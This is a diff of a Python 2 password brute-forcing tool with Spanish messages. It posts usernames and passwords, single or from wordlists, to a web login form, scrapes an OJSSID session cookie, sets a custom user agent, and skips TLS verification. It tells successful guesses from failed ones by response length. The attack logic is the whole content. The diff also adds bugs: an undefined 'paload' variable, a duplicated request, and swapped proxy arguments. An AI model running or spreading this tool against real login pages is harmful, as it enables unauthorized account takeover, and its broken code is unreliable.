@@ -6,17 +6,42 @@ import sys
 from lxml.html import fromstring
 import os.path
 from termcolor import colored
-
+import re
 
 def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip):
 	b = ['','1','12']
 	a = []
 	print colored("\nBeginning BruteForce", 'yellow')
+	
+	requests.packages.urllib3.disable_warnings()
+	req = requests.post(url,verify=False)
+	
+	if cookie is None:
+		for key,value in req.headers.iteritems():
+			if 'set-cookie' in key:
+				regex = re.compile(r'(OJSSID=)((.*);)')
+				match = regex.search(value)
+				try:
+					if match.group():
+						cookie = re.sub(r';(.*)','',match.group(2))
+				except:
+					print 'nio'
+	else:
+		pass
+		
+	if agent is None:
+		agent = 'Kakeando'
+	else:
+		pass
+
+	
 	requests.packages.urllib3.disable_warnings()	
 	for element in b:
 		payload = {userField : element, passField: ''}
-		req = requests.post(url,payload,verify=False)
-		a.append(len(req.content))
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
+		a.append(len(r.content))
 	
 	if len(userFile) == 0 and len(pwdFile) == 0 and len(user) > 0 and len(pwd) > 0 :
 		single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a)
@@ -27,49 +52,20 @@ def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbo
 	elif len(pwd) == 0 and len(userFile) == 0 and len(user) > 0 and len(pwdFile) > 0:
 		passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a)
 		
-def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,list):
+def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,list):
 	
 	mbefore = message
 	requests.packages.urllib3.disable_warnings()		
-	proxy = proxip + ':' + proxport
+	proxy = proxip  + ':' + proxport
 	proxies = {'http' : proxy, 'https' : proxy,}
-	
+		
 	payload = { userField : user, passField: pwd}
-	if len(proxip) ==0:
-		if cookie is None and agent is None:
-			r = requests.post(url,payload, verify=False)
-		
-		elif cookie is None and agent is not None:
-			headers = {'user-agent': agent}
-			r = requests.post(url,payload,headers = headers, verify=False)
-		
-		elif cookie is not None and agent is None:
-			cookies = dict(cookies_are=cookie) 
-			r = requests.post(url,payload, cookies = cookies, verify=False)
-		
-		elif cookie is not None and agent is not None:
-			headers = {'user-agent': agent}
-			cookies = dict(cookies_are=cookie) 
-			r = requests.post(url,payload, cookies = cookies, headers = headers, verify=False)
-	else:
-		if cookie is None and agent is None:
-			r = requests.post(url,payload, proxies = {'http':proxy},verify=False)
-		
-		elif cookie is None and agent is not None:
-			headers = {'user-agent': agent}
-			r = requests.post(url,payload,headers = headers, proxies = {'http':proxy},verify=False)
-		
-		elif cookie is not None and agent is None:
-			cookies = dict(cookies_are=cookie) 
-			r = requests.post(url,payload, cookies = cookies, proxies = {'http':proxy},verify=False)
-		
-		elif cookie is not None and agent is not None:
-			headers = {'user-agent': agent}
-			cookies = dict(cookies_are=cookie) 
-			r = requests.post(url,payload, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
-		
 	
-	if list[1] - 1 == list[0] and list[2]-2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
+	headers = {'user-agent': agent}
+	cookies = dict(cookies_are=cookie) 
+	r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
+	
+	if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
 		if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
 			if int(verbose) == 1:
 				print colored('Ataque no exitoso ', 'red')
@@ -135,40 +131,13 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 				
 			#Login
 			payload = { userField : users[i].rstrip('\n'), passField: pwd}
-			if len(proxip) == 0:
-				if cookie is None and agent is None:
-					r = requests.post(url,data = payload, verify=False)
-		
-				elif cookie is None and agent is not None:
-					headers = {'user-agent': agent}
-					r = requests.post(url,data = payload,headers = headers, verify=False)
+			headers = {'user-agent': agent}
+			cookies = dict(cookies_are=cookie) 
+			r = requests.post(url,data = paload, cookies = cookies, headers = headers, verify=False)
+			headers = {'user-agent': agent}
+			cookies = dict(cookies_are=cookie) 
+			r = requests.post(url,data = paload, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
 				
-				elif cookie is not None and agent is None:
-					cookies = dict(cookies_are=cookie) 
-					r = requests.post(url,data = payload, cookies = cookies, verify=False)
-		
-				elif cookie is not None and agent is not None:
-					headers = {'user-agent': agent}
-					cookies = dict(cookies_are=cookie) 
-					r = requests.post(url,data = paload, cookies = cookies, headers = headers, verify=False)
-			else:
-				if cookie is None and agent is None:
-					r = requests.post(url,data = payload, proxies = {'http':proxy},verify=False)
-		
-				elif cookie is None and agent is not None:
-					headers = {'user-agent': agent}
-					r = requests.post(url,data = payload,headers = headers, proxies = {'http':proxy},verify=False)
-				
-				elif cookie is not None and agent is None:
-					cookies = dict(cookies_are=cookie) 
-					r = requests.post(url,data = payload, cookies = cookies, proxies = {'http':proxy},verify=False)
-		
-				elif cookie is not None and agent is not None:
-					headers = {'user-agent': agent}
-					cookies = dict(cookies_are=cookie) 
-					r = requests.post(url,data = paload, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
-				
-			
 			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
 				if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
 					if int(verbose) == 1:
@@ -236,38 +205,9 @@ def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ve
 		
 			#Login
 			payload = { userField : user, passField: passwords[i].rstrip('\n')}
-			if len(proxip) == 0:
-				if cookie is None and agent is None:
-					r = requests.post(url,data = payload, verify=False)
-		
-				elif cookie is None and agent is not None:
-					headers = {'user-agent': agent}
-					r = requests.post(url,data = payload,headers = headers, verify=False)
-		
-				elif cookie is not None and agent is None:
-					cookies = dict(cookies_are=cookie) 
-					r = requests.post(url,data = payload, cookies = cookies, verify=False)
-		
-				elif cookie is not None and agent is not None:
-					headers = {'user-agent': agent}
-					cookies = dict(cookies_are=cookie) 
-					r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
-			else:
-				if cookie is None and agent is None:
-					r = requests.post(url,data = payload, proxies = {'http':proxy},verify=False)
-		
-				elif cookie is None and agent is not None:
-					headers = {'user-agent': agent}
-					r = requests.post(url,data = payload,headers = headers,proxies = {'http':proxy}, verify=False)
-		
-				elif cookie is not None and agent is None:
-					cookies = dict(cookies_are=cookie) 
-					r = requests.post(url,data = payload, cookies = cookies, proxies = {'http':proxy},verify=False)
-		
-				elif cookie is not None and agent is not None:
-					headers = {'user-agent': agent}
-					cookies = dict(cookies_are=cookie) 
-					r = requests.post(url,data = payload, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
+			headers = {'user-agent': agent}
+			cookies = dict(cookies_are=cookie) 
+			r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
 				
 			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
 				if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
@@ -348,38 +288,9 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,
 				#Login
 				
 				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
-				if len(proxip) == 0:
-					if cookie is None and agent is None:
-						r = requests.post(url,data = payload, verify=False)
-		
-					elif cookie is None and agent is not None:
-						headers = {'user-agent': agent}
-						r = requests.post(url,data = payload,headers = headers, verify=False)
-		
-					elif cookie is not None and agent is None:
-						cookies = dict(cookies_are=cookie) 
-						r = requests.post(url,data = payload, cookies = cookies, verify=False)
-		
-					elif cookie is not None and agent is not None:
-						headers = {'user-agent': agent}
-						cookies = dict(cookies_are=cookie) 
-						r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
-				else:
-					if cookie is None and agent is None:
-						r = requests.post(url,data = payload, proxies = {'http':proxy},verify=False)
-		
-					elif cookie is None and agent is not None:
-						headers = {'user-agent': agent}
-						r = requests.post(url,data = payload,headers = headers, proxies = {'http':proxy},verify=False)
-		
-					elif cookie is not None and agent is None:
-						cookies = dict(cookies_are=cookie) 
-						r = requests.post(url,data = payload, cookies = cookies, proxies = {'http':proxy},verify=False)
-		
-					elif cookie is not None and agent is not None:
-						headers = {'user-agent': agent}
-						cookies = dict(cookies_are=cookie) 
-						r = requests.post(url,data = payload, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
+				headers = {'user-agent': agent}
+				cookies = dict(cookies_are=cookie) 
+				r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
 					
 				if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
 					if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
